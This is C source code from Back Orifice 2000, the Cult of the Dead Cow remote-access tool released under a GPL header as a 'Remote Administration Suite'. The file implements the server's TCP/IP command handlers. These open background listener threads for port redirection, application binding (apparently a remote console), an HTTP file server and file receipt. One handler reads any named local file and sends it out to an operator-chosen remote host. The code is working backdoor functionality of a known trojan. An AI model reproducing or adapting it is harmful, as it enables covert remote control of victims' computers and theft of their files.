/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<cmd\cmd_tcpip.h>

// ---- Type Definitions ----------------------------------

#define TM_PORTTHREAD_DESTROY (WM_APP+69)
#define MAX_CONNECTIONS 16

typedef DWORD (WINAPI *THREADPROC)(LPVOID lpParameter);

#pragma pack(push,1)
typedef struct __port_thread_param {
	SOCKET s;
	THREADPROC proc;
	int nArg1;
	char *svArg2;
	char *svArg3;
} PORT_THREAD_PARAM;

typedef struct __port_info {
	int nPort;
	char svType[256];
	DWORD dwThread;     
	HANDLE hThread;		
	struct __port_info *next;	
} PORT_INFO;
#pragma pack(pop)

// ---- Globals ----------------------------------

PORT_INFO *g_pPortInfoHead;
CRITICAL_SECTION g_PortCritSec;

// ---- Initialization ----------------------------------

void Cmd_Tcpip_Init(void)
{
	g_pPortInfoHead=NULL;
	InitializeCriticalSection(&g_PortCritSec);
}

void Cmd_Tcpip_Kill(void)
{
	PORT_INFO *next;
	while(g_pPortInfoHead!=NULL) {
	
		PostThreadMessage(g_pPortInfoHead->dwThread,TM_PORTTHREAD_DESTROY,0,0);
		WaitForSingleObject(g_pPortInfoHead->hThread,6000);
		
		next=g_pPortInfoHead->next;
		free(g_pPortInfoHead);
		g_pPortInfoHead=next;
	}
	DeleteCriticalSection(&g_PortCritSec);
}

// ---- Port server thread procedure ----------------------------------

DWORD WINAPI PortServerThread(LPVOID lpParameter)
{
	SOCKET s;
	SOCKADDR_IN saddr;
	int nSize;
	BOOL bDone;
	HANDLE hChildren[MAX_CONNECTIONS];
	int i,j,nConnections;
	MSG msg;
	
	PORT_THREAD_PARAM *pptp=(PORT_THREAD_PARAM *) lpParameter;

	nConnections=0;
	bDone=FALSE;
	while(!bDone) {
		// Give up time
		Sleep(20);

		// Do we have a connection pending?
		if(nConnections<MAX_CONNECTIONS) {
			nSize=sizeof(SOCKADDR_IN);
			s=accept(pptp->s,(SOCKADDR *)&saddr,&nSize);
			if(s!=INVALID_SOCKET) {
				// Allocate variable passing data
				PORT_CHILD_PARAM *ppcp=(PORT_CHILD_PARAM *)malloc(sizeof(PORT_CHILD_PARAM));
				if(ppcp!=NULL) {
					ppcp->s=s;
					ppcp->nArg1=pptp->nArg1;
					ppcp->svArg2=pptp->svArg2;
					ppcp->svArg3=pptp->svArg3;
					ppcp->saddr=saddr;
					ppcp->pbDone=&bDone;
	
					DWORD tid;
					hChildren[nConnections]=CreateThread(NULL,0,pptp->proc,ppcp,0,&tid);
					if(hChildren[nConnections]==NULL) {
						free(ppcp);
						closesocket(s);
					} else nConnections++;
				}
			}
		}

		// Look for dead children and clean them up
		for(i=nConnections-1;i>=0;i--) {
			if(WaitForSingleObject(hChildren[i],0)!=WAIT_TIMEOUT) {
				for(j=i+1;j<nConnections;j++) {
					hChildren[j-1]=hChildren[j];
				}
				nConnections--;
			}
		}
		
		// Should we kill our children?
		if(PeekMessage(&msg,(HWND)-1,0,0,PM_REMOVE)) {
			if(msg.message==TM_PORTTHREAD_DESTROY) {
				bDone=TRUE;
				WaitForMultipleObjects(nConnections,hChildren,TRUE,6000);
			}
		}
	}

	closesocket(pptp->s);
	free(pptp);
	return 0;
}


// ---- Port Thread List Maintenance ----------------------------------




// returns 0 if all is well. returns -1 if the port is taken already. -2 on failure.
int __cdecl AddNewPortThread(THREADPROC proc, char *svType, int nPort, int nArg1, char *svArg2, char *svArg3)
{
	// Get thread parameter passing struct 
	PORT_THREAD_PARAM *pptp;
	int nParmSize=sizeof(PORT_THREAD_PARAM) + lstrlen(svArg2) + lstrlen(svArg3) + 2;
	pptp=(PORT_THREAD_PARAM *)malloc(nParmSize);
	if(pptp==NULL) return -2;
	
	// Get thread port info struct
	PORT_INFO *ppi;
	ppi=(PORT_INFO *)malloc(sizeof(PORT_INFO));
	if(ppi==NULL) {
		free(pptp);
		return -2;
	}

	// Create socket for this thread
	SOCKET s;
	s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(s==INVALID_SOCKET) {
		free(pptp);
		free(ppi);
		return -2;
	}
	
	// Bind to desired port
	SOCKADDR_IN saddr;
	memset(&saddr,0,sizeof(SOCKADDR_IN));
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(nPort);
	saddr.sin_addr.s_addr=0;

	if(bind(s,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
		closesocket(s);
		free(pptp);
		free(ppi);
		return -1;
	}

	listen(s,MAX_CONNECTIONS);
	
	// Nonblocking mode
	DWORD argp=TRUE;
	ioctlsocket(s,FIONBIO,&argp);
	
	// Fill in thread param information
	pptp->s=s;
	pptp->proc=proc;
	pptp->nArg1=nArg1;
	pptp->svArg2=(char *)pptp + sizeof(PORT_THREAD_PARAM);
	pptp->svArg3=(char *)pptp + sizeof(PORT_THREAD_PARAM) + lstrlen(svArg2) + 1;
	lstrcpy(pptp->svArg2,svArg2);
	lstrcpy(pptp->svArg3,svArg3);

	// Now create thread and update list
	EnterCriticalSection(&g_PortCritSec);
	
	// Verify port table is okay
	PORT_INFO *cur;
	for(cur=g_pPortInfoHead;cur;cur=cur->next) {
		if(cur->nPort==nPort) {
			closesocket(s);
			free(pptp);
			free(ppi);
			LeaveCriticalSection(&g_PortCritSec);
			return -2;
		}
	}

	// Create Thread (suspended)
	ppi->hThread=CreateThread(NULL,0,PortServerThread,pptp,CREATE_SUSPENDED,&(ppi->dwThread));
	if(ppi->hThread==NULL) {
		closesocket(s);
		free(pptp);
		free(ppi);
		LeaveCriticalSection(&g_PortCritSec);
		return -2;
	}

	// Add to port table
	wsprintf(ppi->svType,"%.64s (%.128s)",svType,svArg2);
	ppi->nPort=nPort;
	ppi->next=g_pPortInfoHead;
	g_pPortInfoHead=ppi;
	
	// Begin thread execution
	ResumeThread(ppi->hThread);
	LeaveCriticalSection(&g_PortCritSec);
	
	return 0;
}

// returns 0 if port was removed. returns -1 if the port is not there. -2 on failure.
int KillPortThread(int nPort)
{
	EnterCriticalSection(&g_PortCritSec);

	// Verify port is okay
	PORT_INFO *cur,*prev;
	prev=NULL;
	for(cur=g_pPortInfoHead;cur;cur=cur->next) {
		if(cur->nPort==nPort) {
			break;
		}
		prev=cur;
	}
	if(cur==NULL) {
		LeaveCriticalSection(&g_PortCritSec);
		return -1;
	}

	// Issue kill message to thread
	PostThreadMessage(cur->dwThread,TM_PORTTHREAD_DESTROY,0,0);

	// Wait for thread to die
	if(WaitForSingleObject(cur->hThread,6000)==WAIT_TIMEOUT) {
		LeaveCriticalSection(&g_PortCritSec);
		return -2;
	}

	// Erase from list
	if(cur==g_pPortInfoHead) g_pPortInfoHead=cur->next;
	else prev->next=cur->next;
	free(cur);

	LeaveCriticalSection(&g_PortCritSec);
	
	return 0;
}


// ---- TCP/IP Command Procedures ----------------------------------


DWORD WINAPI PortRedirThread(LPVOID lpParameter);
DWORD WINAPI PortHTTPThread(LPVOID lpParameter);
DWORD WINAPI PortAppThread(LPVOID lpParameter);
DWORD WINAPI PortFileRecvThread(LPVOID lpParameter);


int CmdProc_RedirAdd(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(AddNewPortThread(PortRedirThread, "Redir", nArg1, nArg1, svArg2, svArg3)!=0) {
		IssueAuthCommandReply(cas_from,comid,0,"Error starting port service.\n");
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Port service startup successful.\n");
	}

	return 0;
}

int CmdProc_AppAdd(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(AddNewPortThread(PortAppThread, "App", nArg1, nArg1, svArg2, svArg3)!=0) {
		IssueAuthCommandReply(cas_from,comid,0,"Error starting port service.\n");
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Port service startup successful.\n");
	}

	return 0;
}

int CmdProc_HTTPEnable(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(AddNewPortThread(PortHTTPThread, "HTTP", nArg1, nArg1, svArg2, svArg3)!=0) {
		IssueAuthCommandReply(cas_from,comid,0,"Error starting port service.\n");
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Port service startup successful.\n");
	}
	
	return 0;
}

int CmdProc_TCPFileReceive(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(AddNewPortThread(PortFileRecvThread, "FileRecv", nArg1, nArg1, svArg2, svArg3)!=0) {
		IssueAuthCommandReply(cas_from,comid,0,"Error starting port service.\n");
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Port service startup successful.\n");
	}
	
	return 0;
}

int CmdProc_PortList(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	PORT_INFO *cur;

	EnterCriticalSection(&g_PortCritSec);

	cur=g_pPortInfoHead;
	while(cur) {
		char svDesc[256];
		wsprintf(svDesc, "Port %d: --> %.200s\n",cur->nPort, cur->svType);
		IssueAuthCommandReply(cas_from,comid,1,svDesc);
		cur=cur->next;
	}
	IssueAuthCommandReply(cas_from,comid,0,"End port redirect list.\n");

	LeaveCriticalSection(&g_PortCritSec);
		
	return 0;
}

int CmdProc_PortDel(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(KillPortThread(nArg1)!=0) {
		IssueAuthCommandReply(cas_from,comid,0,"Unable to remove port redirect.\n");
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Port redirect removed.\n");
	}
	
	return 0;
}

typedef struct {
	CAuthSocket *cas_from;
	int comid;
	SOCKET s;
	HANDLE hInFile;
} SENDTHREADDATA;

DWORD WINAPI TCPFileSendThread(LPVOID dwParam)
{
	char svBuffer[1024];
	SENDTHREADDATA *pstd=(SENDTHREADDATA *)dwParam;

	DWORD dwBytes;
	do {
		ReadFile(pstd->hInFile,svBuffer,1024,&dwBytes,NULL);
		if(send(pstd->s,svBuffer,dwBytes,0)<=0) break;
	} while(dwBytes==1024);

	IssueAuthCommandReply(pstd->cas_from,pstd->comid,0,"Transfer finished.\n");

	closesocket(pstd->s);
	CloseHandle(pstd->hInFile);
	free(pstd);
	return 0;
}

int CmdProc_TCPFileSend(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	// Get thread parameter passing struct 
	SENDTHREADDATA *pstd;
	pstd=(SENDTHREADDATA *)malloc(sizeof(SENDTHREADDATA));
	if(pstd==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Error sending file.\n");
		return -1;
	}
	
	HANDLE hInFile;
	hInFile=CreateFile(svArg3,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
	if(hInFile==INVALID_HANDLE_VALUE) {
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't open local file.\n");
		return -1;
	}
	
	// Create socket for this thread
	SOCKET s;
	s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(s==INVALID_SOCKET) {
		IssueAuthCommandReply(cas_from,comid,0,"Error creating socket.\n");
		CloseHandle(hInFile);
		free(pstd);
		return -1;
	}
	
	// Bind to desired port
	if(nArg1!=0) {
		SOCKADDR_IN saddr;
		memset(&saddr,0,sizeof(SOCKADDR_IN));
		saddr.sin_family=AF_INET;
		saddr.sin_port=htons((WORD)nArg1);
		saddr.sin_addr.s_addr=0;
	
		if(bind(s,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
			IssueAuthCommandReply(cas_from,comid,0,"Error binding local port.\n");
			closesocket(s);
			CloseHandle(hInFile);
			free(pstd);
			return -1;
		}
	}
		
	
	// Fill in thread param information
	pstd->s=s;
	pstd->cas_from=cas_from;
	pstd->comid=comid;
	pstd->hInFile=hInFile;

	// Blocking mode
	DWORD argp=FALSE;
	ioctlsocket(s,FIONBIO,&argp);
	
	// Get remote address and port
	int nPort;
	DWORD dwAddr;
	char *c;
	if((c=strrchr(svArg2,':'))==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"No target port specified\n");
		closesocket(s);
		CloseHandle(hInFile);
		free(pstd);
		return -1;
	}
	nPort=atoi(c+1);
	*c=0;
	
	dwAddr=inet_addr(svArg2);
	if(dwAddr==INADDR_NONE) {
		struct hostent *hent;
		hent=gethostbyname(svArg2);
		if(hent==NULL) {
			IssueAuthCommandReply(cas_from,comid,0,"Could not resolve hostname\n");
			closesocket(s);
			CloseHandle(hInFile);
			free(pstd);
			return -1;
		}
		dwAddr=*(DWORD *)hent->h_addr_list[0];
	}

	// Connect to remote host
	
	SOCKADDR_IN daddr;
	memset(&daddr,0,sizeof(SOCKADDR_IN));
	daddr.sin_family=AF_INET;
	daddr.sin_port=htons(nPort);
	daddr.sin_addr.s_addr=dwAddr;

	if(connect(s,(SOCKADDR *)&daddr,sizeof(SOCKADDR_IN))!=0) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not connect to remote host.\n");
		closesocket(s);
		CloseHandle(hInFile);
		free(pstd);
		return -1;
	}

	// Create transfer thread
	DWORD dwThread;
	if(CreateThread(NULL,0, TCPFileSendThread, pstd, 0, &dwThread)==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Error creating send thread.\n");
		closesocket(s);
		CloseHandle(hInFile);
		free(pstd);
	}
	
	IssueAuthCommandReply(cas_from,comid,1,"Transferring....\n");

	return 0;
}
